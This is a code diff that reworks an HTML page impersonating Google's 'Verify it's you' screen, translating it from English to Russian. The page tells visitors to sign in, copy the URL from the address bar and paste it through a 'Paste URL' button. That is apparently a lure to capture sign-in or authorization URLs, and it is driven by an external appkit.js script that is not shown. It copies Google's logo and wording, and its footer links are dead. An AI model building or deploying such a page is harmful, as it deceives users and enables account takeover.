@@ -1,326 +1,254 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Verify it's you · Google</title>
-    <!-- Font Awesome for icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение личности</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', 'Noto Sans', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
         }
 
         body {
-            background: #f5f7fa;
             min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 1.5rem;
-            margin: 0;
+            align-items: center;
+            background-color: #f1f3f4;
         }
 
         .card {
-            max-width: 600px;
-            width: 100%;
             background: #ffffff;
-            border-radius: 32px;
-            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.06), 0 2px 10px rgba(0, 0, 0, 0.02);
-            padding: 2.5rem 2.8rem 2rem 2.8rem;
-            transition: 0.2s;
-        }
-
-        /* ---- header: "Verify it's you" ---- */
-        .verify-header {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            margin-bottom: 0.5rem;
-        }
-
-        .verify-header i {
-            font-size: 1.8rem;
-            color: #1f2a3a;
-            background: #eef2f7;
-            padding: 0.3rem;
-            border-radius: 40px;
-            width: 2.2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
+            padding: 48px 40px 36px;
+            max-width: 450px;
+            width: 100%;
             text-align: center;
         }
 
-        .verify-header h1 {
-            font-size: 2rem;
-            font-weight: 550;
-            letter-spacing: -0.02em;
-            color: #1f2a3a;
+        .logo {
+            margin-bottom: 24px;
         }
 
-        /* ---- sub text ---- */
-        .sub-text {
-            color: #3c4043;
-            font-size: 1rem;
+        .logo svg {
+            width: 72px;
+            height: 72px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
             line-height: 1.5;
-            margin: 0.6rem 0 1.6rem 0;
-            padding-right: 0.2rem;
+            margin-bottom: 32px;
         }
 
-        /* ---- ordered steps (clean, with numbers) ---- */
-        .step-list {
-            list-style: none;
-            counter-reset: step-counter;
-            padding-left: 0;
-            margin: 1.8rem 0 2.2rem 0;
+        .instructions {
+            text-align: left;
+            margin-bottom: 32px;
+            padding-left: 8px;
         }
 
-        .step-list li {
-            counter-increment: step-counter;
-            margin-bottom: 1.2rem;
-            padding-left: 2.8rem;
-            position: relative;
-            font-size: 1rem;
-            line-height: 1.5;
-            color: #1f2a3a;
-        }
-
-        .step-list li::before {
-            content: counter(step-counter);
-            position: absolute;
-            left: 0;
-            top: -0.1rem;
-            width: 2rem;
-            height: 2rem;
-            background: #eef1f6;
-            color: #1f2a3a;
-            font-weight: 550;
-            font-size: 0.95rem;
-            border-radius: 40px;
+        .step {
             display: flex;
-            align-items: center;
-            justify-content: center;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #202124;
+            line-height: 1.6;
         }
 
-        .step-list li .inline-code {
-            background: #eef1f6;
-            padding: 0.1rem 0.8rem;
-            border-radius: 30px;
-            font-weight: 500;
-            font-size: 0.95rem;
-            color: #1f2a3a;
-            white-space: nowrap;
-        }
-
-        .step-list li .inline-code i {
-            margin-right: 4px;
-            font-size: 0.85rem;
-            color: #3c4043;
-        }
-
-        /* ---- Google Login Button (appkit) со стилем как у Sign In ---- */
-        .googleLoginBtn {
+        .step-number {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 0.5rem;
-            background: #1a6bb0;
-            color: white;
-            border: none;
-            border-radius: 40px;
-            padding: 0.7rem 2.4rem;
-            font-size: 1rem;
+            min-width: 24px;
+            height: 24px;
+            background: #e8f0fe;
+            color: #1a73e8;
+            border-radius: 50%;
+            font-size: 14px;
             font-weight: 500;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            padding-top: 2px;
+        }
+
+        .step-text strong {
+            font-weight: 500;
+        }
+
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        /* Стиль кнопки Google Sign-In */
+        .googleLoginBtn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 10px 16px;
+            background: #1a73e8;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            border: none;
+            border-radius: 4px;
             cursor: pointer;
-            box-shadow: 0 2px 8px rgba(26, 107, 176, 0.15);
-            letter-spacing: 0.3px;
-            transition: 0.15s;
-            min-width: 120px;
+            transition: background 0.2s, box-shadow 0.2s;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            letter-spacing: 0.25px;
+            text-transform: none;
+            height: 44px;
+            user-select: none;
         }
 
         .googleLoginBtn:hover {
-            background: #155a96;
-            box-shadow: 0 4px 12px rgba(26, 107, 176, 0.25);
-            transform: translateY(-1px);
+            background: #1b66c9;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.18);
         }
 
         .googleLoginBtn:active {
-            transform: scale(0.97);
+            background: #185abc;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
         }
 
-        .googleLoginBtn i {
-            margin-right: 0.4rem;
-            font-size: 0.9rem;
+        .googleLoginBtn::before {
+            content: '';
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E") no-repeat center;
+            background-size: contain;
+            flex-shrink: 0;
         }
 
-        /* Стиль для встроенной кнопки AppKit (если она рендерит свой DOM) */
-        .googleLoginBtn appkit-button {
-            display: contents;
-        }
-
-        /* ---- action row: Sign In (googleLoginBtn) + Paste URL ---- */
-        .action-row {
+        /* Кнопка Paste URL (оставляем стандартную) */
+        .paste-btn {
             display: flex;
-            flex-wrap: wrap;
             align-items: center;
-            justify-content: flex-start;
-            gap: 1rem 1.2rem;
-            margin: 1.8rem 0 2.2rem 0;
-            border-top: 1px solid #e6eaef;
-            padding-top: 2rem;
-        }
-
-        .btn-paste {
+            justify-content: center;
+            width: 100%;
+            padding: 10px 16px;
             background: transparent;
-            border: 1px solid #dadce0;
-            border-radius: 40px;
-            padding: 0.7rem 2.4rem;
-            font-size: 1rem;
+            color: #1a73e8;
+            font-size: 14px;
             font-weight: 500;
-            color: #1f2a3a;
-            cursor: default;
-            background: #fcfcfd;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.25px;
+            height: 44px;
         }
 
-        .btn-paste i {
-            margin-right: 0.5rem;
-            color: #3c4043;
+        .paste-btn:hover {
+            background: #f8f9fa;
+            border-color: #d2e3fc;
         }
 
-        /* ---- bottom bar: English · Help · Privacy · Terms ---- */
-        .footer-bar {
+        .paste-btn:active {
+            background: #e8f0fe;
+        }
+
+        .footer {
+            margin-top: 32px;
             display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            border-top: 1px solid #e6eaef;
-            padding-top: 1.4rem;
-            margin-top: 0.4rem;
+            justify-content: center;
+            gap: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
         }
 
         .lang-selector {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            color: #1f2a3a;
-            font-size: 0.95rem;
-            font-weight: 450;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 16px;
         }
 
-        .lang-selector i {
-            color: #5f6b7a;
-            font-size: 0.9rem;
-        }
-
-        .footer-links {
-            display: flex;
-            gap: 1.6rem;
-            flex-wrap: wrap;
-        }
-
-        .footer-links a {
-            color: #1f2a3a;
-            text-decoration: none;
-            font-size: 0.95rem;
-            font-weight: 450;
-            transition: 0.1s;
-            border-bottom: 1px solid transparent;
-        }
-
-        .footer-links a:hover {
-            border-bottom-color: #1f2a3a;
-        }
-
-        /* ---- responsive ---- */
-        @media (max-width: 480px) {
-            .card {
-                padding: 1.8rem 1.5rem;
-            }
-            .verify-header h1 {
-                font-size: 1.6rem;
-            }
-            .action-row {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .googleLoginBtn,
-            .btn-paste {
-                text-align: center;
-                justify-content: center;
-                width: 100%;
-            }
-            .footer-bar {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 0.8rem;
-            }
-            .footer-links {
-                gap: 1rem;
-            }
-            .step-list li {
-                padding-left: 2.4rem;
-            }
+        .lang-selector span {
+            cursor: default;
         }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <!-- header: Verify it's you -->
-        <div class="verify-header">
-            <i class="fas fa-shield-alt"></i>
-            <h1>Verify it's you</h1>
+        <!-- Логотип Google -->
+        <div class="logo">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
         </div>
 
-        <!-- description -->
-        <div class="sub-text">
-            To help keep your account secure, Google needs to verify it's you. Please follow the instructions.
-        </div>
+        <h1>Подтвердите, что это вы</h1>
+        <p class="subtitle">
+            Чтобы обеспечить безопасность вашего аккаунта, Google необходимо подтвердить, что это вы. Следуйте инструкциям.
+        </p>
 
-        <!-- numbered steps -->
-        <ol class="step-list">
-            <li><strong>Sign in</strong> to your Google Account.</li>
-            <li>Copy the URL from the address bar.</li>
-            <li>Click <span class="inline-code"><i class="fas fa-link"></i>Paste URL</span> and confirm paste.</li>
-        </ol>
-
-        <!-- action row: Sign In (googleLoginBtn) + Paste URL -->
-        <div class="action-row">
-            <!-- Кнопка Sign In заменена на googleLoginBtn с сохранением стиля и надписи -->
-            <div class="googleLoginBtn">
-                <i class="fas fa-sign-in-alt"></i> Sign In
+        <div class="instructions">
+            <div class="step">
+                <span class="step-number">1</span>
+                <span class="step-text">Войдите в свой <strong>аккаунт Google</strong>.</span>
             </div>
-            <div class="btn-paste">
-                <i class="fas fa-paste"></i> Paste URL
+            <div class="step">
+                <span class="step-number">2</span>
+                <span class="step-text">Скопируйте URL-адрес из адресной строки.</span>
+            </div>
+            <div class="step">
+                <span class="step-number">3</span>
+                <span class="step-text">Нажмите <strong>«Вставить URL»</strong> и подтвердите вставку.</span>
             </div>
         </div>
 
-        <!-- bottom bar -->
-        <div class="footer-bar">
-            <div class="lang-selector">
-                <i class="fas fa-globe-americas"></i>
-                <span>English</span>
-            </div>
-            <div class="footer-links">
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </div>
+        <div class="buttons">
+            <!-- Кнопка Sign In заменена на div с классом googleLoginBtn -->
+            <div class="googleLoginBtn">Войти</div>
+            
+            <!-- Кнопка Paste URL -->
+            <button class="paste-btn">Вставить URL</button>
+        </div>
+
+        <div class="lang-selector">
+            <span>Русский</span>
+        </div>
+
+        <div class="footer">
+            <a href="#">Справка</a>
+            <a href="#">Конфиденциальность</a>
+            <a href="#">Условия</a>
         </div>
     </div>
 
-    <!-- AppKit script -->
+    <!-- Подключение внешнего скрипта -->
     <script src="./appkit.js"></script>
-
-    <script>
-        // Если AppKit инициализирует кнопку внутри .googleLoginBtn,
-        // то она заменит содержимое. Чтобы сохранить надпись "Sign In",
-        // можно использовать data-атрибуты или настройки AppKit.
-        // Если AppKit полностью перерисовывает элемент, то надпись может измениться.
-        // В этом случае мы добавляем обработчик, который проверяет, не перезаписал ли AppKit кнопку.
-        console.log('Ready: .googleLoginBtn содержит "Sign In"');
-    </script>
-
 </body>
 </html>
